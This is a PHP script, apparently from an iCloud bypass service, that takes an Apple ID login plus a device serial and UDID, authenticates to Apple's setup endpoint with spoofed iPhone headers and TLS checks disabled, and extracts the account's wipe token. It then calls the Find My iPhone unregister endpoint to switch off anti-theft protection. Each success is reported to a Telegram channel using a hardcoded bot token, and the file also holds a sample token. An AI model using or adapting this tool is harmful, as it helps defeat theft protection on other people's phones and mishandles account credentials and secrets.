<?php 
error_reporting(E_ALL&~E_WARNING);
$account = $_REQUEST['account'];
$pass = $_REQUEST['password'];
  $current_encode = mb_detect_encoding($pass, array("ASCII","GB2312","GBK",'BIG5','UTF-8'));  //获取原来编码
$password = mb_convert_encoding($pass, 'UTF-8', $current_encode); //将原来编码转换成utf-8 大小写都可以
$SN = $_REQUEST['SN'];
$UDID = $_REQUEST['UDID'];
$dir = "open";
$dir = 'open/' . $SN;
if(is_dir($dir))
{
   Gettoken($account,$password,$SN,$UDID); 
}
else
{
    Gettoken($account,$password,$SN,$UDID);
}

//echo ("account=".$account."password=".$password."SN=".$SN."UDID=".$UDID);
function Gettoken($account, $Password,$SN,$UDID) {  // 调用函数并传递参数值Gettoken("Hello", "World");

 $url = 'https://setup.icloud.com/setup/fmipauthenticate/'.$account;
 
   $post_data = '{"clientContext":{"productType":"iPhone9,1","buildVersion":"376","appName":"FindMyiPhone","osVersion":"13.1.3","appVersion":"3.0","clientTimestamp":507669952542,"inactiveTime":1,"deviceUDID":"df9b79e42663ff87ccb4023c155b272e293f20f4"},"serverContext":{}}';
    $bacio=base64_encode($account.':'.$Password);
 
   $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_URL , $url ); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER , 1); 
    curl_setopt($ch, CURLOPT_TIMEOUT , 60); 
    curl_setopt($ch, CURLOPT_VERBOSE, 0);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Host: setup.icloud.com", "Accept: */*",  "Authorization: Basic".$bacio, "Proxy-Connection: keep-alive", "X-MMe-Country: EC", "X-MMe-Client-Info: <iPhone7,2> <iPhone OS;8.1.2;12B440> <com.apple.AppleAccount/1.0 (com.apple.Preferences/1.0)>", "Accept-Language: es-es", "Content-Type: text/plist", "Connection: keep-alive"));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_USERAGENT , "User-Agent: Ajustes/1.0 CFNetwork/711.1.16 Darwin/14.0.0" );
    curl_setopt($ch, CURLOPT_POST , 1); 
    curl_setopt($ch, CURLOPT_POSTFIELDS , $post_data ); 

    $xml_response = curl_exec($ch); 

    if (curl_errno($ch)) { 
        $error_message = curl_error($ch); 
        $error_no = curl_errno($ch);

        echo "error_message: " . $error_message . "<br>";
        echo "error_no: " . $error_no . "<br>";
    }

    curl_close($ch);
   
    $response = $xml_response;
   
$ds = explode("<key>dsid</key>", $response)[1];
$dsi = explode("<string>", $ds)[1];
$dsid = explode("</string>", $dsi)[0];
$me = explode("<key>mmeFMIPWipeToken</key>", $response)[1];
$mme = explode("<string>", $me)[1];
$mmeFMIPWipeToken = explode("</string>", $mme)[0];
file_put_contents('dsid',$dsid);
file_put_contents('token',$mmeFMIPWipeToken);
Remove($dsid,$mmeFMIPWipeToken,$SN,$UDID);
   
}
function Remove($dsid, $mmeFMIPWipeToken,$SN,$UDID) {  // 调用函数并传递参数值Gettoken("Hello", "World");

     $url = "https://p33-fmip.icloud.com/fmipservice/findme/".$dsid."/".$UDID."/unregisterV2";
	
	    $post_data = '{
	"serialNumber": "'.$SN.'",
	"deviceContext": {
		"deviceTS": "2023-10-01T20:37:17.880Z"
	},
	"deviceInfo": {
		"productType": "iPhone10,2",
		"udid": "'.$UDID.'",
		"fmipDisableReason": 1,
		"buildVersion": "17A878",
		"productVersion": "16.6.1"
	}
}';     //$dsid = '12038378835';
//$mmeFMIPWipeToken = 'IAAAAAAABLwIAAAAAGUjhLsRDmdzLmljbG91ZC5hdXRovQD3V8CIet19-9R4QM84fKhMPd6ksnIqWupVK7gYv9171hi2YT2T1uRSeoK4ZVWpCZEF66lIHCPjW7qJroNNQ6DpMtwrj-RCA_Urgbx3rRwf-i0N-HdDqFWw4l5q_3QrlJGNeVWXUYfW_8QbUkxIoID6KwCCww~~';
		$bac=base64_encode($dsid.':'.$mmeFMIPWipeToken);
	
		$ch = curl_init(); 
		curl_setopt($ch, CURLOPT_URL , $url ); 
		curl_setopt($ch, CURLOPT_RETURNTRANSFER , 1); 
		curl_setopt($ch, CURLOPT_TIMEOUT , 60); 
		curl_setopt($ch, CURLOPT_VERBOSE, 0);
        curl_setopt($ch, CURLOPT_HEADER, 1);
		curl_setopt($ch, CURLOPT_HTTPHEADER, array("Host: p33-fmip.icloud.com", "Accept-Language: es-es", "X-Apple-PrsId: ".$dsid,  "Accept: */*",  "Content-Type: application/json", "X-Apple-Find-API-Ver: 6.0", "X-Apple-I-MD-RINFO: 17106176", "Connection: keep-alive", "Authorization: Basic ".$bac, "Content-Length: ".strlen($post_data), "X-Apple-Realm-Support: 1.0"));
 
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt($ch, CURLOPT_USERAGENT , "User-Agent: FMDClient/6.0 iPhone9,3/13G36" );
		curl_setopt($ch, CURLOPT_POST , 1); 
		curl_setopt($ch, CURLOPT_POSTFIELDS , $post_data ); 
 
		$xml_response = curl_exec($ch); 
 
		if (curl_errno($ch)) { 
			$error_message = curl_error($ch); 
			$error_no = curl_errno($ch);
 
			echo "error_message: " . $error_message . "<br>";
			echo "error_no: " . $error_no . "<br>";
		}
 
		curl_close($ch);
		$response = $xml_response;
		preg_match('/HTTP\/\d\.\d\s+(\d+)\s+/', $response, $matches);
$status = $matches[1];

if ($status === '200') {
    $a = '200';
    
    $botToken = '5414481547:AAGj3Pujq5_f0haTN18l2aldaBBmnH08TEU';
$chatId = '@otixopenmenu'; 



$message = "SUCCESULLY TURNED OFF FMI ON DEVICE : $SN ✅";

// Create a URL for the Telegram Bot API
$telegramUrl = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);

// Send the message using cURL
$ch = curl_init($telegramUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);
} else {
    $a = '401';
}

echo($a);

		//echo $response;
    
}

?>